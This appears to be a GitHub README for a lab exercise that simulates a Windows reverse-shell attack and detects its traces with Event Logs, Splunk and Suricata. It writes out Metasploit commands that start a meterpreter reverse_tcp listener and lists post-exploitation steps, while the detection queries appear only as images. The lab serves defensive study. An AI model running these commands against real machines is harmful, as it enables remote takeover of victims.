## Objective: Windows reverse shell attack and detect artifacts using Windows Event Logs and Suricata.

Attacker Machine: Kali Linux / Ubuntu (Metasploit)
Victim Machine: Windows 10
Tools Used: - Metasploit (msfconsole) - Windows Event Logs - Splunk (on Ubuntu) - Suricata (network IDS)


## Attack Simulation Steps
1. Launch Metasploit multi/handler:

msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 172.20.10.2
set LPORT 5555
exploit

2. Establish Meterpreter session: Create files, execute payloads, modify registry, attempt scheduled tasks.

3. Artifacts Created on Victim:
   
<img width="757" height="135" alt="image" src="https://github.com/user-attachments/assets/6fa6774f-ad66-4848-8dbf-086d52f0d6e6" />


## Relevant Windows Event IDs
<img width="832" height="402" alt="image" src="https://github.com/user-attachments/assets/d57020a9-c581-4af1-a9fc-6178b744e77c" />


## Example Splunk SPL Queries
<img width="812" height="613" alt="image" src="https://github.com/user-attachments/assets/214a0b96-16b9-4ee3-a577-1107769e2804" />



 ## Screenshots of process

<img width="1691" height="416" alt="image" src="https://github.com/user-attachments/assets/23248c63-74da-4e9b-9be9-c64f4401fe2f" />

<img width="1342" height="750" alt="image" src="https://github.com/user-attachments/assets/65c465ce-6298-436a-a908-9c33f137c834" />


<img width="1368" height="847" alt="image" src="https://github.com/user-attachments/assets/ee628736-3494-476c-b034-e7a86810e345" />


<img width="1358" height="799" alt="image" src="https://github.com/user-attachments/assets/cb041ef2-1f3d-43a1-8e1f-69a9a033ce39" />

